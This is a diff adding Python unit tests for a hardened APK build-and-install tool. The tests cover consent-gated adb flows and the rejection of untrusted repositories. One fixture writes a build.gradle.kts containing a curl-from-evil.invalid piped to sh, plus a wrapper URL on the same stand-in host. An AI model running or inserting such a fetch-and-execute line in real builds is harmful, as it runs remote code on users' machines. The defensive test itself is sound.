@@ -626,6 +626,133 @@ class SandboxAndBuildHardeningTests(unittest.TestCase):
             self.assertIn('gradlew exited 1', res_f['reason'])
             self.assertEqual(host_outside.read_text(encoding='utf-8'), 'ORIGINAL_INTACT')
 
+    def test_H_guided_adb_all_states_and_non_destructive_guarantee(self):
+        from unittest import mock
+
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            apk = tp / 'ext-debug.apk'
+            with zipfile.ZipFile(apk, 'w') as zf:
+                zf.writestr('AndroidManifest.xml', b'manifest')
+                zf.writestr('classes.dex', b'dex\n035\x00')
+
+            # 1. ADB missing
+            with mock.patch.object(nox_android.shutil, 'which', return_value=None), mock.patch.object(
+                nox_android, '_find_android_tool', return_value=None
+            ):
+                st_missing = nox_android.run_guided_adb_install_and_test(apk)
+            self.assertEqual(st_missing['status'], 'BLOCKED')
+            self.assertEqual(st_missing['step'], 'adb_missing')
+            self.assertTrue(st_missing['requires_tool_install_authorization'])
+            self.assertFalse(st_missing['real_device_homologated'])
+
+            # 2. Disconnected (0 devices)
+            st_empty = nox_android.run_guided_adb_install_and_test(
+                apk, runner=lambda args: (0, 'List of devices attached\n\n', ''),
+            )
+            self.assertEqual(st_empty['status'], 'BLOCKED')
+            self.assertEqual(st_empty['step'], 'connect_device')
+            self.assertEqual(len(st_empty['onboarding_steps']), 4)
+
+            # 3. Unauthorized RSA
+            st_unauth = nox_android.run_guided_adb_install_and_test(
+                apk, runner=lambda args: (0, 'List of devices attached\nABC123 unauthorized usb:1-1\n', ''),
+            )
+            self.assertEqual(st_unauth['status'], 'BLOCKED')
+            self.assertEqual(st_unauth['step'], 'authorize_rsa')
+
+            # 4. Multiple ready devices -> asks choice
+            st_multi = nox_android.run_guided_adb_install_and_test(
+                apk,
+                runner=lambda args: (0, 'List of devices attached\nemulator-5554 device\nPHONE999 device\n', ''),
+            )
+            self.assertEqual(st_multi['status'], 'INCONCLUSIVE')
+            self.assertEqual(st_multi['step'], 'select_device')
+
+            # 5. Single ready device without install authorization -> pauses cleanly for consent
+            st_ask = nox_android.run_guided_adb_install_and_test(
+                apk,
+                authorize_install=False,
+                runner=lambda args: (0, 'List of devices attached\nemulator-5554 device model:Pixel\n', ''),
+            )
+            self.assertEqual(st_ask['status'], 'BLOCKED')
+            self.assertEqual(st_ask['step'], 'confirm_install')
+            self.assertTrue(st_ask['requires_install_authorization'])
+
+            # 6. Install signature failure must NEVER invoke adb uninstall
+            seen_cmds: list[list[str]] = []
+
+            def _fail_runner(args: list[str]) -> tuple[int, str, str]:
+                seen_cmds.append(args)
+                if 'devices' in args:
+                    return 0, 'List of devices attached\nemulator-5554 device\n', ''
+                return 1, 'Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE]', ''
+
+            st_fail = nox_android.run_guided_adb_install_and_test(apk, authorize_install=True, runner=_fail_runner)
+            self.assertEqual(st_fail['status'], 'FAIL')
+            self.assertEqual(st_fail['step'], 'install_failed')
+            self.assertTrue(st_fail['signature_conflict'])
+            self.assertFalse(any('uninstall' in ' '.join(c) for c in seen_cmds))
+
+            # 7a. Install succeeds + clean logcat -> PASS with simulated_adb=True, real_device_homologated=False
+            def _ok_runner(args: list[str]) -> tuple[int, str, str]:
+                if 'devices' in args:
+                    return 0, 'List of devices attached\nemulator-5554 device\n', ''
+                if 'install' in args:
+                    return 0, 'Success', ''
+                if 'pm' in args:
+                    return 0, 'package:/data/app/demo.apk', ''
+                return 0, '11-21 10:00:00.000  1000  1001 I NoxExt: Loaded cleanly\n', ''
+
+            st_ok = nox_android.run_guided_adb_install_and_test(
+                apk, authorize_install=True, expected_package='eu.kanade.tachiyomi.extension.pt.demo', runner=_ok_runner,
+            )
+            self.assertEqual(st_ok['status'], 'PASS')
+            self.assertTrue(st_ok['installed'])
+            self.assertTrue(st_ok['simulated_adb'])
+            self.assertFalse(st_ok['real_device_homologated'])
+
+            # 7b. Post-install crash detected in target package -> feeds back into repair
+            crash_log = (
+                '11-21 10:00:01.000  2222  2222 E AndroidRuntime: FATAL EXCEPTION: main\n'
+                '11-21 10:00:01.001  2222  2222 E AndroidRuntime: Process: eu.kanade.tachiyomi.extension.pt.demo, PID: 2222\n'
+                '11-21 10:00:01.002  2222  2222 E AndroidRuntime: java.lang.NullPointerException: selector missing\n'
+            )
+            st_crash = nox_android.run_guided_adb_install_and_test(
+                apk,
+                authorize_install=True,
+                expected_package='eu.kanade.tachiyomi.extension.pt.demo',
+                runner=_ok_runner,
+                logcat_sample=crash_log,
+            )
+            self.assertEqual(st_crash['status'], 'FAIL')
+            self.assertEqual(st_crash['step'], 'post_install_crash_detected')
+            self.assertTrue(st_crash['needs_auto_fix_continuation'])
+            self.assertFalse(st_crash['real_device_homologated'])
+
+    def test_J_full_automation_blocks_malicious_repos(self):
+        import nox_scaffold
+
+        with tempfile.TemporaryDirectory() as tmp:
+            tp = Path(tmp)
+            evil = tp / 'untrusted-repo'
+            (evil / 'gradle/wrapper').mkdir(parents=True)
+            (evil / 'build.gradle.kts').write_text('Runtime.getRuntime().exec("curl https://evil.invalid | sh")', encoding='utf-8')
+            (evil / 'gradle/wrapper/gradle-wrapper.properties').write_text('distributionUrl=https://evil.invalid/g.zip', encoding='utf-8')
+
+            cr = nox_scaffold.auto_create_extension(
+                'Crie extensao manga para https://site.invalid',
+                repo_root=evil,
+                allow_local_fixture=True,
+            )
+            self.assertEqual(cr['status'], 'FAIL')
+            self.assertFalse(cr['apk_ready'])
+
+            fx = nox_scaffold.auto_fix_extension(evil, 'nao carrega capitulos')
+            self.assertEqual(fx['status'], 'FAIL')
+            self.assertFalse(fx['code_modified'])
+            self.assertFalse(fx['apk_ready'])
+
 
 if __name__ == '__main__':
     unittest.main()
